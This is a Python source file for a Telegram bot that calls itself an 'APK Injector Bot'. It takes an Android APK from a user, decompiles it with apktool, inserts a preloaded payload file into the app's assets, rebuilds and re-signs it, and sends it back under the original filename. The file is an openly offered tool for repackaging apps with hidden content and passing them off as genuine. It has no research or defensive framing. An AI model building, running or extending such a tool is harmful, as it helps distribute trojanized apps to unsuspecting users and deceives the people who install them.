import os
import sys
import logging
import tempfile
import subprocess
from pathlib import Path
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    stream=sys.stdout,
)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_TOKEN", "").strip()

KEYSTORE_PATH = None
for path in ["/app/release.keystore", "./release.keystore"]:
    if os.path.exists(path):
        KEYSTORE_PATH = path
        break

KEYSTORE_PASS = os.getenv("KEYSTORE_PASS", "android").strip()

PAYLOAD = None
PAYLOAD_SIZE = 0
try:
    for path in ["/app/payload.b64", "./payload.b64", "/app/payload_data.bin", "./payload_data.bin"]:
        if os.path.exists(path) and os.path.getsize(path) > 0:
            with open(path, "rb") as f:
                PAYLOAD = f.read()
            PAYLOAD_SIZE = len(PAYLOAD)
            logger.info(f"Payload loaded from {path}: {PAYLOAD_SIZE} bytes")
            break
    if not PAYLOAD:
        logger.error("Payload not found!")
except Exception as e:
    logger.error(f"Error loading payload: {e}")


def check_tools():
    for tool in ["apktool", "jarsigner", "keytool"]:
        try:
            r = subprocess.run([tool], capture_output=True, timeout=10)
            logger.info(f"Tool OK: {tool}")
        except FileNotFoundError:
            logger.error(f"Tool MISSING: {tool} - WILL FAIL")
        except Exception as e:
            logger.info(f"Tool present: {tool} ({e})")


def run_cmd(cmd, label):
    logger.info(f"[{label}] Running: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    except subprocess.TimeoutExpired:
        logger.error(f"[{label}] TIMEOUT after 300s")
        return False
    if result.returncode != 0:
        logger.error(f"[{label}] FAILED (code {result.returncode})")
        if result.stdout:
            logger.error(f"[{label}] stdout: {result.stdout[:500]}")
        if result.stderr:
            logger.error(f"[{label}] stderr: {result.stderr[:500]}")
        return False
    logger.info(f"[{label}] OK")
    return True


def inject_payload(apk_bytes):
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_path = Path(tmpdir)
            input_apk = tmp_path / "input.apk"
            output_apk = tmp_path / "output.apk"
            signed_apk = tmp_path / "signed.apk"
            decompiled_dir = tmp_path / "decompiled"

            with open(input_apk, "wb") as f:
                f.write(apk_bytes)
            logger.info(f"APK written: {len(apk_bytes)} bytes")

            logger.info("Decompiling APK...")
            if not run_cmd(
                ["apktool", "d", "-f", "-o", str(decompiled_dir), str(input_apk)],
                "decompile"
            ):
                return None

            payload_path = decompiled_dir / "assets" / "payload.bin"
            payload_path.parent.mkdir(parents=True, exist_ok=True)
            with open(payload_path, "wb") as f:
                f.write(PAYLOAD)
            logger.info(f"Payload injected: {len(PAYLOAD)} bytes")

            logger.info("Rebuilding APK...")
            if not run_cmd(
                ["apktool", "b", "-o", str(output_apk), str(decompiled_dir)],
                "rebuild"
            ):
                return None

            if not output_apk.exists():
                logger.error("Rebuilt APK not found")
                return None

            if KEYSTORE_PATH:
                logger.info("Signing APK with jarsigner...")
                sign_ok = run_cmd(
                    [
                        "jarsigner",
                        "-keystore", KEYSTORE_PATH,
                        "-storepass", KEYSTORE_PASS,
                        "-keypass", KEYSTORE_PASS,
                        "-signedjar", str(signed_apk),
                        str(output_apk),
                        "release",
                    ],
                    "sign"
                )

                if sign_ok and signed_apk.exists():
                    with open(signed_apk, "rb") as f:
                        return f.read()

                logger.warning("Signing failed, returning unsigned APK")
                with open(output_apk, "rb") as f:
                    return f.read()
            else:
                logger.warning("No keystore, returning unsigned APK")
                with open(output_apk, "rb") as f:
                    return f.read()

    except Exception as e:
        logger.error(f"Inject error: {e}", exc_info=True)
        return None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "APK Injector Bot\n\n"
        "Send an APK and I will inject the payload.\n\n"
        "Commands:\n"
        "/status - Check payload\n"
        "/help - Help"
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if PAYLOAD:
        mb = len(PAYLOAD) // (1024 * 1024)
        await update.message.reply_text(f"Payload loaded: {mb} MB")
    else:
        await update.message.reply_text("No payload loaded!")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Help:\n\n"
        "/start - Start\n"
        "/status - Check payload\n"
        "/help - This message\n\n"
        "Send an APK file to inject the payload."
    )


async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not PAYLOAD:
        await update.message.reply_text("Payload not loaded!")
        return

    document = update.message.document
    if not document or not document.file_name.endswith(".apk"):
        await update.message.reply_text("Send a valid APK file!")
        return

    status_msg = await update.message.reply_text("Downloading APK...")

    try:
        file = await context.bot.get_file(document.file_id)
        apk_data = await file.download_as_bytearray()

        await status_msg.edit_text("Injecting payload... (may take a few minutes)")

        result = inject_payload(bytes(apk_data))

        if result:
            await update.message.reply_document(
                document=result,
                filename=document.file_name,
                caption="APK injected successfully!"
            )
        else:
            await status_msg.edit_text("Error injecting payload!")

    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"Error: {str(e)}")


def main():
    logger.info("=== Bot starting ===")
    logger.info(f"Python: {sys.version}")
    logger.info(f"TOKEN: {'SET' if TOKEN else 'NOT SET!'}")
    logger.info(f"Keystore: {KEYSTORE_PATH or 'NOT FOUND'}")
    logger.info(f"Payload: {len(PAYLOAD) if PAYLOAD else 'NOT LOADED'}")
    check_tools()

    if not TOKEN:
        logger.error("TELEGRAM_TOKEN not set! Exiting.")
        sys.exit(1)

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))

    logger.info("Bot started! Waiting for messages...")
    app.run_polling()


if __name__ == "__main__":
    main()
